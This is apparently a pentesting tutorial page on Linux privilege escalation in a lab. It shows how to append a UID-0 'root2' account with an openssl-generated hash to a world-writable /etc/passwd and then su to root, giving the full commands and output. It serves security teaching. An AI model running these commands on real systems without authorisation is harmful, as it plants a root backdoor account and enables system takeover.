---
description: Example of privilege escalation via password authentication abuse
---

# Abusing Password Authentication

Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in `/etc/shadow`, which is not readable by normal users. Historically however, password hashes, along with other account information, were stored in the world-readable file `/etc/passwd`. For backwards compatibility, if a password hash is present in the second column of an `/etc/passwd` user record, it is considered valid for authentication and it _takes precedence_ over the respective entry in `/etc/shadow`, if available. This means that if an attacker can write into `/etc/passwd`, they can effectively set an arbitrary password for any account.

In a [previous example](../enumeration/automated-enumeration.md), the `/etc/passwd` file of the example machine was found to be world-writable. With this in mind, first generate a password and it's corresponding hash (these will be added in to /etc/passwd):

`openssl` can be used with the `passwd` argument to hash the chosen text with the correct hash type. By default, if no other option is specified, `openssl` will generate a hash using the [crypt](https://en.wikipedia.org/wiki/Crypt\_\(C\)) algorithm, a supported hashing mechanism for Linux authentication. In this case the example password will be "`r00t!`"

```shell-session
kali@kali:~$ openssl passwd r00t!
$1$hgsVmrX9$dUH5lIza9JiEQ..LQqvvq0
```

From here, this will be constructed into a new line for `/etc/passwd`. The password will be associated with a user `root2`. Aside from the username and password hash (first 2 fields of line) the remainder will match `root`'s actual `/etc/passwd` file line:

```shell-session
joe@debian-privesc:~$ cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
```

This means the full line will be:

```
root2:$1$hgsVmrX9$dUH5lIza9JiEQ..LQqvvq0:0:0:root:/root:/bin/bash
```

&#x20; Which can be written to the insecure `/etc/passwd` file from the user `joe`'s account:

```shell-session
joe@debian-privesc:~$ echo "root2:\$1\$hgsVmrX9\$dUH5lIza9JiEQ..LQqvvq0:0:0:root:/root:/bin/bash" >> /etc/passwd

joe@debian-privesc:~$ su root2
Password:

root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)

root@debian-privesc:/home/joe# whoami
root
```

* Note the dollar signs(`$`) had to be escaped in the bash string with "`\$`"

As shown in the output above, this technique successfully leveraged an insecure `/etc/passwd` file into `root` access.
